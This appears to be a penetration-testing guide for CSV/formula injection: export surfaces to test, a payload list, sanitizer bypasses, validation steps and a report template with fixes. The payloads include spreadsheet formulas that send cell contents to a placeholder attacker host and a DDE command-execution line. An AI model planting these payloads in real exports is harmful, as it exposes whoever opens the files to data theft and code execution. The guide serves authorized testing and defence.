# CSV / Formula Injection Payloads

## Overview
CSV injection (formula injection) happens when user input is exported into CSV
and opened in spreadsheet apps that evaluate formulas.

## Prerequisites
```bash
# Use a safe, offline environment to open CSV files
# Do not enable macros or external connections
```

## Phase 1: Identify Export Surfaces
```bash
# Common export surfaces
# - Admin reports (users, orders, tickets)
# - Audit logs
# - Billing exports
# - CRM exports
```

## Phase 2: Payload List
```bash
cat > /workspace/output/TARGET_csv_payloads.txt <<'PAYLOADS'
# Basic execution
=1+1
+1+1
-1+1
@SUM(1,1)

# Leading whitespace / tab bypass
\t=1+1
 =1+1
\r=1+1

# URL exfil (Excel/LibreOffice)
=HYPERLINK("https://ATTACKER","click")
=WEBSERVICE("https://ATTACKER/?x="&ENCODEURL(A1))

# Google Sheets variants
=IMPORTXML("https://ATTACKER","//a")
=IMPORTDATA("https://ATTACKER/data.csv")
=IMAGE("https://ATTACKER/track.png")

# DDE (legacy Excel, often blocked)
=CMD|' /C calc'!A0

# Locale separator variants
=HYPERLINK("https://ATTACKER";"click")
PAYLOADS
```

## Phase 3: Bypass Common Sanitizers
```bash
# If app strips leading '=', try other prefixes or whitespace
# Examples:
#   +SUM(1,1)
#   -SUM(1,1)
#   @SUM(1,1)
#   \t=SUM(1,1)
```

## Phase 4: Validation
```bash
# Export CSV after inserting payloads
# Open in offline viewer and check if cells evaluate
# Confirm that payload remains unescaped in the export
```

## Report Template

```
Target: TARGET
Assessment Date: <DATE>

## Confirmed Findings
- [ ] CSV export evaluates injected formulas
- [ ] Sanitization bypass via whitespace or alternative prefixes

## Evidence
- Payloads: /workspace/output/TARGET_csv_payloads.txt
- Exported file: <path>

## Recommendations
1. Prefix dangerous values with a single quote
2. Neutralize leading characters: = + - @ and tabs
3. Sanitize at export time, not only on input
```

## Output Files
- `/workspace/output/TARGET_csv_payloads.txt` — payload list

indicators: csv injection, formula injection, excel injection, spreadsheet injection, csv formula
